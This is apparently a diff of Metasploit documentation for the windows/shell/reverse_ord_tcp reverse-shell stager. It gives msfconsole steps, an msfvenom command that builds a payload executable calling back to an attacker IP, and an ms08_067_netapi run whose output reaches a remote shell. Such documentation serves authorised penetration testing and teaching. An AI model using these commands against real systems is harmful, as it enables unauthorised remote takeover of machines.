@@ -1,19 +1,19 @@
-windows/shell/reverse_ord_tmp:Windows Command Shell, Reverse Ordinal TCP Stager is an unique windows payload for Metasploit Framework.
-It is really small (<100 bytes), it uses the existing ws2_32.dll in memory in connect and load the next stage of the payload.
+# Windows Command Shell
 
-It provides a shell on the target machine which can be used to achieve almost anything on the target pc.
+Reverse Ordinal TCP Stager is an unique windows payload for Metasploit Framework.
+
+It is really small (<100 bytes), it uses the existing ws2_32.dll in memory in connect and load the next stage of the payload. It provides a shell on the target machine which can be used to achieve almost anything on the target pc.
 
 ## Vulnerable Application
 
 This Meterpreter payload is suitable for the following environments:
 
+* Windows x86
 * Windows x64
 
-## Verification Steps
+## Usage
 
-windows/shell/reverse_tcp is typically used in two different ways.
-
-1. As a payload for an exploit:
+### As a payload for an exploit:
 
 To check its compatibility with an exploit, select the exploit in the msf console and type the ```info``` command. The output will be similar to:
 
@@ -50,23 +50,24 @@ If the platform field includes Windows, then windows/shell/reverse_ord_tcp can b
 payload.
 
 To use at as a payload for an exploit, use the following commands:
-1. In msfconsole, select an exploit module compatible with windows.
-2. Configure the options for that exploit.
-3. Then run the following command: ```set windows/shell/reverse_ord_tcp```
-4. Set the ```LHOST``` option, to be the IP address that the payload should connect to.
-5. Then run the command: ```exploit```.
+
+ 1. In msfconsole, select an exploit module compatible with windows.
+ 2. Configure the options for that exploit.
+ 3. Then run the following command: ```set windows/shell/reverse_ord_tcp```
+ 4. Set the ```LHOST``` option, to be the IP address that the payload should connect to.
+ 5. Then run the command: ```exploit```.
 
 If the exploit is successful, the payload will get executed.
 
 
-2. As a standalone(executable)
+### As a standalone executable
 
-To use it as an executable, msfvenom can be used(msfvenom replaced msfpayload and msfencode in the year //)
-
-A typical example of doing this is as follows:
+To use it as an executable, use the msfvenom tool. A typical example of doing this is as follows:
 
 
-```./msfvenom -p windows/shell/reverse_ord_tcp LHOST=192.168.23.1 LPORT=4444 -f exe -o /tmp/ordpayload.exe```
+```
+./msfvenom -p windows/shell/reverse_ord_tcp LHOST=192.168.23.1 LPORT=4444 -f exe -o /tmp/ordpayload.exe```
+```
 
 ## Scenarios
 
@@ -110,10 +111,11 @@ Exploit target:
 msf exploit(windows/smb/ms08_067_netapi) > exploit
 ```
 
-The above commands will result into the following scenario(leading to a shell on the target machine ):
+The above commands will result into the following scenario, leading a shell
+on the target machine:
 
 ```
-[*] Started reverse TCP handler on 192.168.56.1:4444 
+[*] Started reverse TCP handler on 192.168.56.1:4444
 [*] 192.168.56.3:445 - Automatically detecting the target...
 [*] 192.168.56.3:445 - Fingerprint: Windows XP - Service Pack 2 - lang:English
 [*] 192.168.56.3:445 - Selected Target: Windows XP SP2 English (AlwaysOn NX)
